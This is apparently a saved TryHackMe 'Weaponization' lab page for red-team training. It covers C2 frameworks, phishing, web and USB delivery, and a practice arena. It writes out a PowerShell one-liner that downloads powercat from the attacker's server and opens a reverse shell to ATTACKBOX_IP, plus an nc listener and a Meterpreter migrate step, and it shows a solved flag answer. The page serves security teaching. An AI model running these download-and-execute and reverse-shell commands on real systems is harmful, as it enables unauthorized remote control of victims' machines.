remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.</span></code>
	    </pre>
	</div>
</div>
<p>Now, we need to set up a web server on that AttackBox to serve the <span class="notion-enable-hover" style="outline:0px;white-space:pre-wrap;caret-color:rgb(55, 53, 47);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">powercat.ps1</span><span style="font-size:1rem;color:rgb(55, 53, 47);font-family:ui-sans-serif, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;white-space:pre-wrap;caret-color:rgb(55, 53, 47)"> </span><span style="font-size:1rem">that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port&nbsp;</span><span class="notion-enable-hover" style="outline:0px;white-space:pre-wrap;caret-color:rgb(55, 53, 47);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">8080</span><span style="font-size:1rem;color:rgb(55, 53, 47);font-family:ui-sans-serif, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;white-space:pre-wrap;caret-color:rgb(55, 53, 47)">.</span></p><div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top">Terminal</div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> powercat</span></span>
<span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server <span class="token number">8080</span></span></span>
<span class="token output"><span>Serving <a class="l1yS32Eo glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;l1yS32Eo&#39;)">HTTP</a> on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span></span></code>
	    </pre>
	</div>
</div>
<p>On the AttackBox, we need to listen on port <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">1337</span> using <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">nc</span> to receive the connection back from the victim.</p><div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top">Terminal</div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">1337</span></span></span></code>
	    </pre>
	</div>
</div>

<p><span>Now, from the victim machine, we download the payload and execute it using <a class="malSC1wm glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;malSC1wm&#39;)">PowerShell</a> payload as follows,</span></p>

<div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top">Terminal</div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm\Desktop&gt; powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"</span></code>
	    </pre>
	</div>
</div>

<p>Now that we have executed the command above, the victim machine downloads the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">powercat.ps1</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">&nbsp;payload from our web server (on the AttackBox) and then executes it locally on the target using </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">cmd.exe</span><span style="font-size:1rem">&nbsp;</span>and sends a connection back to the AttackBox that is listening on port<span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">1337</span><span style="font-size:1rem">. After a couple of seconds, we should receive the connection call back:</span></p>

<div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top">Terminal</div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">1337</span>  listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">1337</span> <span class="token punctuation">..</span>.</span></span>
<span class="token output">10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm&gt;</span></code>
	    </pre></div></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Command And Control - (C2 Or C&amp;C) 
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p style="text-align:left;color:rgb(14, 16, 26);background-color:transparent;margin-top:0pt;margin-bottom:0pt"><span>This task introduces the basic concept of Command and Control (<a class="xFqHKpNq glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;xFqHKpNq&#39;)">C2</a>) frameworks used in Red team operations.</span></p><p style="text-align:left;color:rgb(14, 16, 26);background-color:transparent;margin-top:0pt;margin-bottom:0pt"><br></p><p style="text-align:center;color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><img src="./TryHackMe _ Weaponization_files/9671adc6cb778fa7b151921f753e2f96.jpg" style="width:750px;height:363.281px"><strong><br></strong></p><p style="text-align:center;color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><strong><br></strong></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="font-size:24px">What is Command and Control (C2)?</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span><a class="uswKks71 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;uswKks71&#39;)">C2</a> frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations.  C2 frameworks provide fast and straightforward approaches to:</span></span></p><ul style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Generate various malicious payloads</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Enumerate the compromised machine/networks</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Perform privilege escalation and pivoting</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Lateral movement&nbsp;</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">And many others</span></li></ul><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><br></span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span>Some popular <a class="ZUT0WlTy glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;ZUT0WlTy&#39;)">C2</a> frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate</span></span><span style="background-color:transparent;font-size:1rem">&nbsp;between red team operations once the initial access is gained to a system.</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><br></p><p><span style="font-size:24px">Cobalt Strike</span></p><p>Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations,&nbsp;including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.<br></p><p><span style="font-size:24px"><span><a class="XuWTXGvn glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;XuWTXGvn&#39;)">PowerShell</a> Empire</span></span></p><p><span><a class="t1MFUs1O glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;t1MFUs1O&#39;)">PowerShell</a> Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment.&nbsp;</span><span style="font-size:1rem"><span>If you want to learn more about <a class="Let4GunL glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;Let4GunL&#39;)">PowerShell</a> Empire, we suggest trying out this room: </span><a href="https://tryhackme.com/room/rppsempire" target="_blank">Empire</a>.</span></p><p><span style="font-size:24px">Metasploit&nbsp;</span></p><p>Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage.&nbsp;<span style="font-size:1rem">If you want to learn more about the Metasploit framework, we suggest checking the <a href="https://tryhackme.com/module/metasploit" target="_blank">Metasploit module</a>.</span></p><p><span>Most of the <a class="ZYdPSg3m glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;ZYdPSg3m&#39;)">C2</a> frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the </span><a href="https://tryhackme.com/room/introtoc2" target="_blank">Intro to C2</a> room.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Delivery Techniques
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3><span style="font-size:24px">Delivery Techniques</span><br></h3>
<p>Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/54108dbd9d1c3d64fb86f2ad04b5949e.png" style="width:50%" alt="Emails being sent from a computer"><br></p>
<p style="text-align:center"><br></p><p><span style="font-size:24px">Email Delivery</span><br></p>
<p>It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit <a href="https://attack.mitre.org/techniques/T1566/001/" target="_blank">here</a>. This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.</p>
<p><span>The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (<a class="OWQ1O0H4 glossary-term" onclick="initPopOver(&#39;DKIM&#39;, &#39;OWQ1O0H4&#39;)">DKIM</a>), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.</span></p>
<p>The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.</p>
<p>Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/08a3f660501cf5171277534e40aa96b8.png" style="width:50%" alt="A laptop connected with various devices and networks"><br></p>
<p style="text-align:center"></p><h3><span style="font-size:24px">Web Delivery</span><br></h3>
<p>Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit <a href="https://attack.mitre.org/techniques/T1189/" target="_blank">here</a>.</p>
<p>This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.</p>
<p>In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/ff8ca3c104fa32e30603ecf97ee0d72e.png" style="width:50%" alt="A laptop and a smartphone with a USB cable"><br></p><h3></h3><p><span style="font-size:24px">USB Delivery</span><br></p><p>This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit <a href="https://attack.mitre.org/techniques/T1091/" target="_blank">here</a>.</p><p>Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.</p><p>

</p><p>Common USB attacks used to weaponize USB devices include <a href="https://shop.hak5.org/products/usb-rubber-ducky-deluxe" target="_blank">Rubber Ducky</a> and <a href="https://www.minitool.com/news/usbharpoon.html" target="_blank">USBHarpoon</a>, charging&nbsp;USB cable, such as&nbsp;<a href="https://shop.hak5.org/products/omg-cable" target="_blank">O.MG Cable</a><span style="font-size:1rem">.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Which method is used to distribute payloads to a victim at social events?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *** ********" value="USB Delivery" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 9                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Practice Arena
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="61a296da15bcab0664bca617" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><span>We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious <a class="5QXD71yX glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;5QXD71yX&#39;)">HTA</a> links automatically.&nbsp;</span><span style="font-size:1rem">Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-top-left-radius:3px;border-top-right-radius:3px;border-bottom-right-radius:3px;border-bottom-left-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://MACHINE_IP:8080/</span><span style="font-size:1rem">.</span></p><p><span style="font-size:1rem">Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.</span></p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/d92b185b39570d4740e6f6a8e905124a.png"><span style="font-size:1rem"><br></span></p><p style="text-align:left"><span>The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious <a class="dFXyQlcE glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;dFXyQlcE&#39;)">HTA</a> link, the web application will visit your link.</span></p><p style="text-align:left"><b>Note for Doc files</b>: the simulation used in the provided Windows 10 machine will open the malicious Word document and <u>be closed within 90 seconds</u>. In order to get longer prescience, you need to migrate as soon as you receive the connection back.&nbsp;</p><p style="text-align:left">In the Metasploit framework,&nbsp;we can inject our current process into another process on the victim machine using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">migrate</span><span style="font-size:1rem">. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">migrate</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">post-module as follow,</span></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">meterpreter &gt; run post/windows/manage/migrate 

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: svchost.exe (3280)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4960
[+] Successfully migrated into process 4960</span></code>
</pre></div></div>
<p style="text-align:left">In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.</p><p style="text-align:left">For reference, you can use the MSFVenom Cheat Sheet on this <a href="https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/" target="_blank">website</a>.</p><p style="text-align:center"></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What is the flag? <b>Hint</b>: Check the user desktop folder for the flag!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************************}" value="THM{b4dbc2f16afdfe9579030a929b799719}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Weaponization_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 20225 users are in here and this room is 580 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Weaponization_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Weaponization_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="5DctyDvk-kriMzMCVkdb7OhkIVJVXbK06iIo">
<input type="hidden" name="roomCode" value="weaponization">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Weaponization_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
